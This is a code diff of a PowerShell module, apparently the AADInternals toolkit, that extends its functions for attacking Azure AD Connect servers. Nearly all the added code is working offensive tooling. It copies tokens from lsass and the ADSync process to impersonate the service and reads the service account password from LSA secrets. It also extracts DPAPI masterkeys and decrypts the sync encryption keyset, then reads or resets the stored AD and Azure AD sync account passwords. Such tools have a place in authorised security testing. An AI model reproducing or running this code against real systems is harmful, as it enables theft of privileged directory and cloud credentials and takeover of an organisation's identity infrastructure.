@@ -3,29 +3,80 @@
 # Oct 29th 2019
 function Check-Server
 {
-    # Check that we are on AADConnect server
-    if((Get-Service ADSync -ErrorAction SilentlyContinue) -eq $null)
+    Param(
+            [Parameter(Mandatory=$true)]
+            [bool]$AsADSync,
+            [Parameter(Mandatory=$true)]
+            [bool]$force
+    )
+    process
     {
-        Write-Error "This command needs to be run on a computer with AADConnect"
-        return $false
-    }
-
-    # Add the encryption reference (should always be there)
-    Add-Type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll’
-
-    # Check the version number 1.4.xx.xx changed the location of key sets so not working :(
-    try
-    {
-        $ver=((Get-WmiObject Win32_Service -Filter "Name='ADSync'").PathName.Split('"')[1] | Get-Item).VersionInfo.FileVersion
-        $ver2=$ver.split('.')
-        if($ver2[0] -eq 1 -and $ver2[1] -ge 4)
+        # Check that we are on AADConnect server and that the service is running
+        if($force -ne $true -and (Get-Service ADSync -ErrorAction SilentlyContinue) -eq $null)
         {
-            Write-Warning "Passwords can be extracted only for ADSync version 1.3.xx.xx! The current version is $ver"
+            Write-Error "This command needs to be run on a computer with ADSync running!"
+            return $false
+        }
+
+        # Add the encryption reference (should always be there)
+        $ADSyncLocation = Get-ItemPropertyValue -Path "HKLM:SOFTWARE\Microsoft\AD Sync" -Name Location
+        Add-Type -path "$ADSyncLocation\Bin\mcrypt.dll"
+
+        $ADSyncUser=""
+        $CurrentUser = "{0}\{1}" -f $env:USERDOMAIN,$env:USERNAME
+
+        # Check the version number: since 1.4.xx.xx uses DPAPI instead of registry to store the keyset
+        try
+        {
+            $serviceWMI = Get-WmiObject Win32_Service -Filter "Name='ADSync'" -ErrorAction SilentlyContinue
+            $ADSyncUser=  $serviceWMI.StartName
+            $ver=         ($serviceWMI.PathName.Split('"')[1] | Get-Item).VersionInfo.FileVersion
+            $ver2=$ver.split('.')
+            if($force -ne $true -and $ver2[0] -eq 1 -and $ver2[1] -ge 4 -and !$AsADSync)
+            {
+                Write-Warning "ADSync passwords can be read or modified as local administrator only for ADSync version 1.3.xx.xx!"
+                Write-Warning "The current version is $ver and access to passwords requires running as ADSync ($ADSyncUser)."
+                Write-Warning "Use the -AsADSync $true parameter to try again!"
+                return $false
+            }
+        }
+        catch
+        {
+            Write-Verbose "Could not get WMI info, probably already running as ADSync so skipping the ""elevation"""
+            $AsADSync = $false
+        }
+
+        # Elevate the current thread by copying the token from ADSync service
+        if($AsADSync)
+        {
+            # First we need to get connection once to the DB to get token. 
+            # If done after "elevating" to ADSync, all SQL connections to configuration database will fail.
+            $SQLclient = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
+            $SQLclient.Open()
+            $SQLclient.Close()
+            try
+            {
+                # Copy the tokens from lsass and miiserver (ADSync) processes
+                Write-Verbose "Trying to ""elevate"" by copying token from lsass and then miiserver (ADSync) processes"
+                $elevation = [AADInternals.Native]::copyLsassToken() -and [AADInternals.Native]::copyADSyncToken()
+            }
+            catch
+            {
+                $elevation = $false
+            }
+
+            if($elevation)
+            {
+                Write-Verbose """Elevation"" to ADSync succeeded!"
+                Write-Warning "Running as ADSync ($ADSyncUser). You MUST restart PowerShell to restore $CurrentUser rights."
+            }
+            else
+            {
+                Write-Error "Could not change to $ADSyncUser. MUST be run as administrator!"
+            }
         }
     }
-    catch{}
 }
-
 
 # May 15th 2019
 function Get-SyncCredentials
@@ -50,13 +101,18 @@ function Get-SyncCredentials
     AADUserPassword                $.1%(lxZ&/kNZz[r
 #>
     [cmdletbinding()]
-    Param()
+    Param(
+        [Parameter(Mandatory=$false)]
+        [bool]$AsADSync=$true,
+        [Parameter(Mandatory=$false)]
+        [switch]$force
+    )
     Process
     {
         # Do the checks
-        if((Check-Server) -eq $false)
+        if((Check-Server -AsADSync $AsADSync -force $force) -eq $false)
         {
-            return
+           return
         }
 
         # Read the encrypt/decrypt key settings
@@ -96,10 +152,11 @@ function Get-SyncCredentials
         $attributes["ADDomain"]=([xml]$ADConfig).'adma-configuration'.'forest-login-domain'
         $attributes["AADUser"]=([xml]$AADConfig).MAConfig.'parameter-values'.parameter[0].'#text'
 
-        # Decrypt config data
-        $KeyMgr = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
         try
         {
+            # Decrypt config data
+            $KeyMgr = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
+
             $KeyMgr.LoadKeySet($entropy, $instance_id, $key_id)
             $key = $null
             $KeyMgr.GetActiveCredentialKey([ref]$key)
@@ -121,6 +178,7 @@ function Get-SyncCredentials
 
         # Return
         return New-Object -TypeName PSObject -Property $attributes
+        
     }
 }
 
@@ -167,12 +225,16 @@ function Update-SyncCredentials
     Param(
         [Parameter(Mandatory=$False)]
         [String]$AccessToken,
-        [Switch]$RestartADSyncService
+        [Switch]$RestartADSyncService,
+        [Parameter(Mandatory=$false)]
+        [bool]$AsADSync=$true,
+        [Parameter(Mandatory=$false)]
+        [switch]$force
      )
     Process
     {
         # Do the checks
-        if((Check-Server) -eq $false)
+        if((Check-Server -AsADSync $AsADSync -force $force) -eq $false)
         {
            return
         }
@@ -189,7 +251,7 @@ function Update-SyncCredentials
         $AdminUser = (Read-Accesstoken -AccessToken $at).upn
 
         # Get the current configuration
-        $SyncCreds = Get-SyncCredentials
+        $SyncCreds = Get-SyncCredentials -force
         $SyncUser = ($SyncCreds.AADUser.Split("@")[0])
 
         Write-Verbose "Updating password for $SyncUser as $AdminUser"
@@ -252,7 +314,7 @@ function Update-SyncCredentials
         Write-Host "Password successfully updated to Azure AD and configuration database!"
 
         # Return        
-        Get-SyncCredentials
+        Get-SyncCredentials -force
 
         # Restart the ADSync service if requested
         if($RestartADSyncService)
@@ -275,7 +337,7 @@ function Set-ADSyncAccountPassword
 
     .Description
     Sets the password of ADSync service account to AD and WID configuration database. MUST be run on AADConnect server
-    as company administrator.
+    as domain administrator.
   
     .Example
     Set-AADIntADSyncAccountPassword -NewPassword 'Pa$$w0rd'
@@ -309,24 +371,25 @@ function Set-ADSyncAccountPassword
     Param(
         [Parameter(Mandatory=$True)]
         [String]$NewPassword,
-        [Switch]$RestartADSyncService
+        [Switch]$RestartADSyncService,
+        [Parameter(Mandatory=$false)]
+        [bool]$AsADSync=$true,
+        [Parameter(Mandatory=$false)]
+        [switch]$force
      )
     Process
     {
-        # Check that we are on AADConnect server
-        if((Get-Service ADSync -ErrorAction SilentlyContinue) -eq $null)
+        # Do the checks
+        if((Check-Server -AsADSync $AsADSync -force $force) -eq $false)
         {
-            Write-Error "This command needs to be run on a computer with AADConnect"
-            return
+           return
         }
-        
-        
 
         # Add the encryption reference (should always be there)
         Add-Type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll’
 
         # Get the current configuration
-        $SyncCreds = Get-SyncCredentials
+        $SyncCreds = Get-SyncCredentials -force
         $SyncUser = $SyncCreds.ADUser
 
         Write-Verbose "Updating password for $SyncUser"
@@ -392,7 +455,7 @@ function Set-ADSyncAccountPassword
         Write-Host "Password successfully updated to AD and configuration database!"
 
         # Return        
-        Get-SyncCredentials
+        Get-SyncCredentials -force
 
         # Restart the ADSync service if requested
         if($RestartADSyncService)
@@ -404,4 +467,280 @@ function Set-ADSyncAccountPassword
             Write-Host "Remember to restart the sync service: Restart-Service ADSync" -ForegroundColor Yellow
         }
     }
+}
+
+
+# Decrypts AD and AAD passwords with the given key and IV
+# May 3rd 2020
+function Get-DecryptedConfigPassword
+{
+    [cmdletbinding()]
+    Param(
+        [Parameter(Mandatory=$true)]
+        [byte[]]$Data,
+        [Parameter(Mandatory=$true)]
+        [byte[]]$Key,
+        [Parameter(Mandatory=$true)]
+        [guid]$InitialVector
+    )
+    Process
+    {
+        # Create the AES decryptor        
+        $aes=New-Object -TypeName System.Security.Cryptography.AesCryptoServiceProvider
+        $aes.Mode = "CBC"
+        $aes.Key =  $Key
+        $aes.IV =   $iv.ToByteArray()
+        $dc=$aes.CreateDecryptor()
+        
+        # Decrypt the data    
+        $decData = $dc.TransformFinalBlock($Data,0,$Data.Length)
+
+        # Convert to xml and get the password
+        [xml]$decDataXml = ([text.encoding]::Unicode.GetString($decData)).trimEnd(@(0x00,0x0a,0x0d))
+        $decPassword = $decDataXml.'encrypted-attributes'.attribute.'#text'
+
+        Write-Verbose "DecryptedConfigPassword: $($decDataXml.OuterXml)"
+
+        # Return
+        return $decPassword
+
+    }
+}
+
+# Encrypts AD or AAD password with the given key and IV
+# May 3rd 2020
+function New-DecryptedConfigPassword
+{
+    [cmdletbinding()]
+    Param(
+        [Parameter(Mandatory=$true)]
+        [string]$Password,
+        [Parameter(Mandatory=$true)]
+        [byte[]]$Key,
+        [Parameter(Mandatory=$true)]
+        [guid]$InitialVector
+    )
+    Process
+    {
+        # Escaping password for xml
+        $NewPassword = [System.Security.SecurityElement]::Escape($Password)
+
+        # Create the AES encryptor        
+        $aes=New-Object -TypeName System.Security.Cryptography.AesCryptoServiceProvider
+        $aes.Mode = "CBC"
+        $aes.Key =  $Key
+        $aes.IV =   $iv.ToByteArray()
+        $de=$aes.CreateEncryptor()
+        
+        # Encrypt the data    
+        $data = "<encrypted-attributes><attribute name=""password"">$NewPassword</attribute></encrypted-attributes>"
+        $binData = [text.encoding]::Unicode.GetBytes($data)
+        $decData = $de.TransformFinalBlock($binData,0,$binData.Length)
+
+        Write-Verbose "DecryptedConfigPassword: $data"
+
+        # Return
+        return $decData
+
+    }
+}
+
+# Retrieves ADSync encryption key used to encrypt and decrypt configuration data
+# May 3rd 2020
+function Get-SyncEncryptionKey
+{
+<#
+    .SYNOPSIS
+    Gets ADSync encryption key using the given entropy and instance id
+
+    .DESCRIPTION
+    Gets the ADSync encryption key used to encrypt and decrypt passwords for service users of Azure AD and local AD
+
+    .Example
+    Get-AADIntSyncEncryptionKey -Entropy a1c80460-6fe9-4c6f-bf31-d7a34c878dca -InstanceId 299b1d83-9dc6-479a-92f1-2357fc5abfed
+
+    Id     Guid                                 CryptAlg Key
+    --     ----                                 -------- ---
+    100000 299b1d83-9dc6-479a-92f1-2357fc5abfed    26128 {4, 220, 54, 13...}
+
+    .Example
+    $key_info = Get-AADIntSyncEncryptionKeyInfo
+
+    PS C:\>Get-AADIntSyncEncryptionKey -Entropy $key_info.Entropy -InstanceId $key_info.InstanceId
+
+    Id     Guid                                 CryptAlg Key                   
+    --     ----                                 -------- ---                   
+    100000 299b1d83-9dc6-479a-92f1-2357fc5abfed    26128 {4, 220, 54, 13...}
+#>
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory=$true)]
+        [guid]$Entropy,
+        [Parameter(Mandatory=$true)]
+        [guid]$InstanceId
+    )
+
+    # Define the return variable
+    $retVal = $null
+   
+    # Fetch the full name of the ADSync user. Should be in the format DOMAIN\AAD_xxxxxxxxxxxx
+    $FullName=(Get-WmiObject Win32_Service -Filter "Name='ADSync'").StartName
+    $userName = $FullName.split("\")[1]
+
+    # Get user's SID
+    $userSID=(Get-WmiObject win32_useraccount -Filter "Name='$userName'").SID
+
+    
+    # Get the stored password for the ADSync service -> this is the password of DOMAIN\AAD_xxxxxxxxxxxx user!
+    $LSAUserName = "_SC_ADSync"
+    $LSASecret=Get-LSASecrets -Users "_SC_ADSync"
+    $password=$LSASecret.PasswordTxt
+
+    Write-Verbose "UserName: $FullName"
+    Write-Verbose "SID:      $userSID"
+    Write-Verbose "Password: $password`n`n"
+
+    # As we now know the password of the user, we can get user masterkeys without system masterkey
+    # Get user's masterkeys and decode them with username and password
+    #$masterKeys=Get-UserMasterkeys -UserName $userName -SID $userSID -Password $password
+
+    # Get the system key
+    $systemKey = Get-LSABackupKeys | Where-Object name -eq "RSA"
+    
+    # Get the system masterkeys
+    $masterKeys = Get-SystemMasterkeys -SystemKey $systemKey.Key
+
+    # Get the user's masterkeys
+    $usrMasterKeys = Get-UserMasterkeys -UserName $userName -SystemKey $systemKey.Key -SID $userSID
+
+    # Merge the keys
+    foreach($key in $usrMasterKeys.Keys)
+    {
+        $masterKeys[$key]=$usrMasterKeys[$key]
+    }
+
+    # Get user's credentials with the masterkeys
+    $credentials = Get-LocalUserCredentials -UserName $userName -MasterKeys $masterKeys
+
+    # Try to find the correct credential entry
+    foreach($cred in $credentials)
+    {
+        $target = $cred.Target
+        # Check the target, we are looking for:
+        # LegacyGeneric:target=Microsoft_AzureADConnect_KeySet_{00000000-0000-0000-0000-0000000000}_100000
+        if($target.toLower().Contains(([guid]$instanceid).ToString()))
+        {
+            $keySetId = [int]$target.Split("_")[4]
+            # The keyset is actually a DPAPIBlob, so decrypt it using a native DPAPI method in LOCAL MACHINE context
+            $keySet = [AADInternals.Native]::getDecryptedData($cred.Secret,$entropy.toByteArray())
+            
+            Write-Verbose "KeySet ($keySetId): $(Convert-ByteArrayToHex -Bytes $keySet)"
+
+            # Parse the keyset
+            $key = Parse-KeySetBlob -Data $keySet
+
+            # Check whether the id and guid matches
+            if($key.Id -eq $keySetId -and $key.Guid -eq $instanceId)
+            {
+                $retVal = $key
+            }
+            
+        }
+    }
+
+    return $retVal
+}
+
+# Parses the MMSK key set blob
+# May 3rd 2020
+function Parse-KeySetBlob
+{
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$true)]
+        [byte[]]$Data
+    )
+    Process
+    {
+        # Parse the KeySet
+        $p=4 # Skip the MMSK string at the beginning
+        $version =       [System.BitConverter]::ToInt32($Data,$p);$p+=4
+        $id =            [System.BitConverter]::ToInt32($Data,$p);$p+=4
+        $guid =          [guid][byte[]]$Data[$p..$($p+15)]; $p+=16
+        $unk0 =          [System.BitConverter]::ToInt32($Data,$p);$p+=4
+        $unk1 =          [System.BitConverter]::ToInt32($Data,$p);$p+=4
+        $unk2 =          [System.BitConverter]::ToInt32($Data,$p);$p+=4
+        $unk3 =          [System.BitConverter]::ToInt32($Data,$p);$p+=4
+        $unk4 =          [System.BitConverter]::ToInt32($Data,$p);$p+=4
+        $keyBlockSize =  [System.BitConverter]::ToInt32($Data,$p);$p+=4
+        $secondKeySize = [System.BitConverter]::ToInt32($Data,$p);$p+=4
+        $unk7 =          [System.BitConverter]::ToInt32($Data,$p);$p+=4
+        $unk8 =          [System.BitConverter]::ToInt32($Data,$p);$p+=4
+        $unk9 =          [System.BitConverter]::ToInt32($Data,$p);$p+=4
+        $unk10 =         [System.BitConverter]::ToInt32($Data,$p);$p+=4
+        $unk11 =         [System.BitConverter]::ToInt32($Data,$p);$p+=4
+        $unk12 =         [System.BitConverter]::ToInt32($Data,$p);$p+=4
+        $enAlg =         [System.BitConverter]::ToInt32($Data,$p);$p+=4
+        $keyLength =     [System.BitConverter]::ToInt32($Data,$p);$p+=4
+        $key =           $Data[$p..$($p+$keyLength-1)]; $p+=$keyLength
+        #$unk15 =         [System.BitConverter]::ToInt32($Data,$p);$p+=4
+        #$enAlg2 =        [System.BitConverter]::ToInt32($Data,$p);$p+=4
+        #$keyLength2 =    [System.BitConverter]::ToInt32($Data,$p);$p+=4
+        #$key2 =          $Data[$p..$($p+$keyLength2-1)]; $p+=$keyLength2
+
+        Write-Verbose "*** KEYSET ***"
+        Write-Verbose "Id:       $id"
+        Write-Verbose "Guid:     $guid"
+        Write-Verbose "CryptAlg: $enAlg $($ALGS[$enAlg])"
+        Write-Verbose "Key:      $(Convert-ByteArrayToHex -Bytes $key)`n`n"
+
+        $attributes=[ordered]@{
+            "Id" =       $id
+            "Guid" =     $guid
+            "CryptAlg" = $enAlg
+            "Key" =      $key
+        }
+        
+
+        return New-Object PSObject -Property $attributes
+        
+    }
+}
+
+# Gets entropy and instanceid from the local configuration database
+# May 6th 2020
+function Get-SyncEncryptionKeyInfo
+{
+<#
+    .SYNOPSIS
+    Gets ADSync encryption key info from the local configuration database
+
+    .DESCRIPTION
+    Gets ADSync encryption key info from the local configuration database
+
+    .Example
+    Get-AADIntSyncEncryptionKeyInfo
+
+    Name                           Value 
+    ----                           ----- 
+    InstanceId                     299b1d83-9dc6-479a-92f1-2357fc5abfed
+    Entropy                        a1c80460-6fe9-4c6f-bf31-d7a34c878dca
+#>
+    [CmdletBinding()]
+    param()
+
+    # Read the encrypt/decrypt key settings
+    $SQLclient = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
+    $SQLclient.Open()
+    $SQLcmd = $SQLclient.CreateCommand()
+    $SQLcmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
+    $SQLreader = $SQLcmd.ExecuteReader()
+    $SQLreader.Read() | Out-Null
+    $key_id = $SQLreader.GetInt32(0)
+    $instance_id = $SQLreader.GetGuid(1)
+    $entropy = $SQLreader.GetGuid(2)
+    $SQLreader.Close()
+    $SQLClient.Close()
+
+    return New-Object PSObject @{Entropy = $entropy; InstanceId = $instance_id}
 }
